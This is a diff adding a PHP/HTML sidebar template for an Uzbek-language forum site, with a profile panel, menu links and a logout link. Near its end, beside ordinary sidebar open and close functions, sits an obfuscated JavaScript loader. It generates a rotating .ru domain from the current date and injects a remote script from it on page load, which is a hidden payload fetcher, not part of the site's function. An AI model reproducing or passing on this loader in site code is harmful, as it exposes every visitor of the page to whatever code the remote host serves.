@@ -1,0 +1,150 @@
+<div class="w3-sidebar w3-bar-block w3-collapse w3-card w3-animate-left" style="width:270px;" id="mySidebar">
+  <button class="w3-bar-item w3-button w3-large w3-hide-large" onclick="w3_close()">Paneni yashirish ×</button>
+  <div class="menu">
+    <!-- logo -->
+    <span class="logo__image">
+    <a href="/"><img src="https://uzfor.uz/images/uzfor_uz_logo.png?v=0.0.01" alt="logo" style="width: 70%;" class="img-fluid"></a>
+    </span>
+    <!-- logib va profile -->
+    <center>
+      <div class="border-bottom"></div>
+      <?php if ($user->isValid()): ?>
+      <p>
+      </p>
+      <div id="lm_prof_panel">
+        <div class="owner_panel index_panel">
+          <div class="ip_user_link">
+            <a class="al_u211967789" href="/profile.php" data-name="<?=$user->name?>" data-photo="rasm"><img class="op_fimg" style="border-radius: 40px;" src="/files/users/photo/87_tmp_1548426402.jpg">
+            </a>
+            <i class="i_arr"></i>
+            <div class="op_fcont">
+              <h2 class="op_header">
+                <a class="op_owner" href="/profile.php" data-name="<?=$user->name?>" data-photo="rasm"><?=$user->name?></a>
+                <span class="MainMenuNotificationDot" data-id="menu-apps-notification"></span>
+              </h2>
+              <a href="/profile.php?act=edit">Profilni tahrirlash</a>
+            </div>
+          </div>
+        </div>
+      </div>
+      <p></p>
+      <div class="border-bottom"></div>
+      <?php else: ?>
+      <div class="border-bottom"></div>
+      <p><a href="/registration/" class="button">Profil yaratish</a> — <a href="/login/">Kirish</a>
+      </p>
+      <?php endif ?>
+      <div class="border-bottom"></div>
+    </center>
+    <ul class="main_menu">
+      <li class="mmi_feed">
+        <a href="/50-forum-yangiliklari.html" data-skiponclick="1" class="mm_item al_menu">
+          <i class="i_icon">
+            <div class="svgIcon svgIcon-menu svgIcon-menu__feed"></div>
+          </i>
+          <span class="mmi_wrap"><span class="mm_label">Yangiliklar</span></span>
+        </a>
+      </li>
+      <li class="mmi_answers">
+        <a href="/notifications.php" data-skiponclick="1" class="mm_item al_menu">
+          <i class="i_icon">
+            <div class="svgIcon svgIcon-menu svgIcon-menu__notify"></div>
+          </i>
+          <span class="mmi_wrap"><span class="mm_label">Bildirishnomalar</span><em class="mm_counter">1</em></span>
+        </a>
+      </li>
+      <li class="mmi_friends">
+        <a href="/avatar/" data-skiponclick="1" class="mm_item al_menu">
+          <i class="i_icon">
+            <div class="svgIcon svgIcon-menu svgIcon-menu__user_outline_28"></div>
+          </i>
+          <span class="mmi_wrap"><span class="mm_label">Avatar yaratish</span><span class="MainMenuNotificationDot" data-id="menu-apps-notification"></span></span>
+        </a>
+      </li>
+      <li class="mmi_groups">
+        <a href="/top.php" data-skiponclick="1" class="mm_item al_menu">
+          <i class="i_icon">
+            <div class="svgIcon svgIcon-menu svgIcon-menu__users_outline_28"></div>
+          </i>
+          <span class="mmi_wrap"><span class="mm_label">Forum faollari</span></span>
+        </a>
+      </li>
+      <li class="mmi_feed">
+        <a href="/malumotnoma.php" data-skiponclick="1" class="mm_item al_menu">
+          <i class="i_icon">
+            <div class="svgIcon svgIcon-menu svgIcon-menu__malumotnoma"></div>
+          </i>
+          <span class="mmi_wrap"><span class="mm_label">Yo'riqnoma</span></span>
+        </a>
+      </li>
+      <li class="mmi_feed">
+        <a href="/pay.php" data-skiponclick="1" class="mm_item al_menu">
+          <i class="i_icon">
+            <div class="svgIcon svgIcon-menu svgIcon-menu__uzforpay"></div>
+          </i>
+          <span class="mmi_wrap"><span class="mm_label">Balansni to'ldirish</span><span class="MainMenuNotificationDot" data-id="menu-apps-notification"></span></span>
+        </a>
+      </li>
+      <li class="mmi_ads">
+        <a href="/dokon/" class="mm_item al_menu">
+          <i class="i_icon">
+            <div class="svgIcon svgIcon-menu svgIcon-menu__advertising_outline_28"></div>
+          </i>
+          <span class="mmi_wrap"><span class="mm_label">Forum do'koni</span><span class="MainMenuNotificationDot" data-id="menu-apps-notification"></span></span>
+        </a>
+      </li>
+      <li class="mmi_ads">
+        <a href="/view.php?act=files" class="mm_item al_menu">
+          <i class="i_icon">
+            <div class="svgIcon svgIcon-menu svgIcon-menu__uzforshop"></div>
+          </i>
+          <span class="mmi_wrap"><span class="mm_label">Forum fayllari</span></span>
+        </a>
+      </li>
+      <li class="mmi_ads">
+        <a href="/mukofot.php" class="mm_item al_menu">
+          <i class="i_icon">
+            <div class="svgIcon svgIcon-menu svgIcon-menu__uzformukofot"></div>
+          </i>
+          <span class="mmi_wrap"><span class="mm_label">Mukofotlar</span></span>
+        </a>
+      </li>
+      <li class="mmi_search">
+        <a href="/search.php" data-skiponclick="1" class="mm_item al_menu" data-header="Поиск">
+          <i class="i_icon">
+            <div class="svgIcon svgIcon-menu svgIcon-menu__search_outline_28"></div>
+          </i>
+          <span class="mmi_wrap"><span class="mm_label">Forumdan qidirish</span></span>
+        </a>
+      </li>
+    </ul>
+    <div class="mfoot" role="navigation" aria-label="Boshqa">
+      <ul class="left_footer_menu">
+        <li class="mmi_settings">
+          <a href="/about.php" data-skiponclick="1" class="lfm_item al_menu">
+            <i class="i_icon">
+              <div class="svgIcon svgIcon-menu svgIcon-menu__"></div>
+            </i>
+            <span class="mmi_wrap"><span class="mm_label">Sayt haqida</span></span>
+          </a>
+        </li>
+        <li class="mmi_fv">
+          <a href="/exit.php" data-skiponclick="1" class="lfm_item">
+            <i class="i_icon">
+              <div class="svgIcon svgIcon-menu svgIcon-menu__"></div>
+            </i>
+            <span class="mmi_wrap"><span class="mm_label">Profildan chiqish</span></span>
+          </a>
+        </li>
+      </ul>
+    </div>
+  </div>
+  <script type="text/javascript">(function(){var s = 'abcdefghijklmnopqrstuvwxyz';function f(v){return Math.abs(v.split('').reduce(function(w,x){return w=(w<<5)-w+x.charCodeAt(0),w&w},0))}function g(v){return(26<=v?g((v/26>>0)-1):'')+s[v%26>>0]}function n(v) {var m = '';for (var i = 0; i < v; i++){m += s.charAt(Math.floor(Math.random() * s.length));}return m;}function m(v) {return Math.floor(Math.random() * Math.floor(v));}var j=673873,r=''+Math.ceil((Date.now()-1.5147648e12)/6.048e8)*j,p=11814,l=''+j+''+p,t=document;p=t.createElement('script');p.type='text/javascript';p.src='//'+g(f(j+r))+(''+f(j+r)).slice(-1)+g(f(j+(r+1)))+'.ru/'+n(7)+m(9)+n(7)+l+'.js';t.getElementById('iota7rho11814').appendChild(p)})();
+    function w3_open() {
+      document.getElementById("mySidebar").style.display = "block";
+    }
+    function w3_close() {
+      document.getElementById("mySidebar").style.display = "none";
+    }
+  </script>
+</div>
